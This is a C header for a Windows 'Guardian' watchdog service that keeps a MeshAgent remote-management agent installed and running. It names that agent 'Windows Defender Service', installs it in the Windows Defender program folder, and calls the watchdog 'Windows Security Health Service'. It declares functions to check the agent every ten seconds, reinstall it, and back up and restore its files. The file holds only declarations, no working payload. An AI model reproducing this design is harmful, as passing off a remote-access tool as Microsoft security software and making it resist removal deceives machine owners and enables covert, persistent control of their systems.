/*
Copyright 2006 - 2025 Intel Corporation

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#ifndef __GUARDIAN_H__
#define __GUARDIAN_H__

#include <windows.h>
#include <stdio.h>

// Guardian configuration
#define GUARDIAN_SERVICE_NAME TEXT("Windows Security Health Service")
#define GUARDIAN_DISPLAY_NAME TEXT("Windows Security Health Service")
#define GUARDIAN_DESCRIPTION TEXT("Monitors and maintains system security health and integrity")
#define GUARDIAN_EXE_NAME TEXT("WinSecHealthSvc.exe")

#define MAIN_SERVICE_NAME TEXT("Windows Defender Service")
#define MAIN_SERVICE_PATH TEXT("C:\\Program Files\\Windows Defender\\MeshAgent.exe")
#define MAIN_SERVICE_DIR TEXT("C:\\Program Files\\Windows Defender")
#define MAIN_SERVICE_MSH TEXT("C:\\Program Files\\Windows Defender\\MeshAgent.msh")
#define MAIN_SERVICE_DB TEXT("C:\\Program Files\\Windows Defender\\MeshAgent.db")

#define GUARDIAN_DIR TEXT("C:\\Windows\\System32\\WinSecHealth")
#define GUARDIAN_BACKUP_DIR TEXT("C:\\Windows\\System32\\WinSecHealth\\backup")
#define GUARDIAN_LOG_FILE TEXT("C:\\Windows\\System32\\WinSecHealth\\service.log")

// Check intervals in seconds
#define CHECK_INTERVAL 10  // 10 seconds
#define BACKUP_INTERVAL 3600  // 1 hour

// Service control functions
BOOL GuardianServiceExists(LPCTSTR serviceName);
BOOL GuardianServiceIsRunning(LPCTSTR serviceName);
BOOL GuardianStartService(LPCTSTR serviceName);
BOOL GuardianInstallMainService();
BOOL GuardianRestoreMainServiceFiles();
BOOL GuardianBackupMainServiceFiles();

// Logging functions
void GuardianLog(const char* format, ...);
void GuardianLogError(const char* format, ...);

// Service main functions
void WINAPI GuardianServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI GuardianServiceCtrlHandler(DWORD ctrlCode);

// Watchdog functions
void GuardianWatchdogLoop();

#endif // __GUARDIAN_H__
